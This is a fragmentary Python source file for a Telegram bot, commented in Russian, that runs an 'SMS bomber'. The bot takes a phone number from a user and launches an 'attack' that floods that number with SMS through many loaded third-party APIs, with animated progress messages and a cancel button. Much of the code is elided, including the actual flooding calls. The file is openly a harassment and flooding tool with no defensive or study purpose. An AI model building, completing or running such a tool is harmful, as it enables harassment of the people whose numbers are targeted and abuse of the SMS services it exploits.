...
class SmsBomber:
    def __init__(self):
        ...
        logger.info(f"Загружено {len(self.apis)} API")
...
# ===================== SMS-БОМБЕР (ЗАПУСК С НЕМЕДЛЕННЫМ ОТВЕТОМ) =====================
def start_bombing(chat_id, phone, user_id, iterations=3):
    global cancel_flags
    cancel_flags[user_id] = False

    # Сразу отправляем подтверждение
    bot.send_message(chat_id, f"💣 Номер принят! Начинаю бомбинг для {phone}...")

    # Создаём сообщение для прогресса
    progress_msg = bot.send_message(chat_id, "⏳ Подготовка...")
    time.sleep(0.5)
    animate_loading(chat_id, progress_msg.message_id, "🔄 Запуск атаки...")
    ...
    def progress_callback(current, total, api_name):
        ...
        emoji = '🚀' if percent < 30 else '🔥' if percent < 60 else '💥' if percent < 90 else '⭐'
        spinner = random.choice(['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'])
        text = f"{emoji} Бомбинг {spinner}\n[{bar}] {percent}%  ({current}/{total})\n📲 {api_name[:15]}"
        try:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("❌ Отменить", callback_data=f"cancel_{user_id}"))
            bot.edit_message_text(text, chat_id, progress_msg.message_id, reply_markup=markup)
        except:
            pass
...
def handle_private_text(message):
    ...
    if user_id in user_data:
        ...
        logger.info(f"Текущий шаг для {user_id}: {step}")
        if step == 'awaiting_username':
            ...
            if phone_raw.startswith('+'):
                phone_clean = phone_raw[1:]
                display_phone = phone_raw
            else:
                phone_clean = phone_raw
                display_phone = phone_raw
            if re.match(r'^\d+$', phone_clean) and 10 <= len(phone_clean) <= 15:
                # Отвечаем сразу, чтобы пользователь не ждал
                bot.send_message(chat_id, f"💣 Номер принят! Начинаю бомбинг для {display_phone}...")
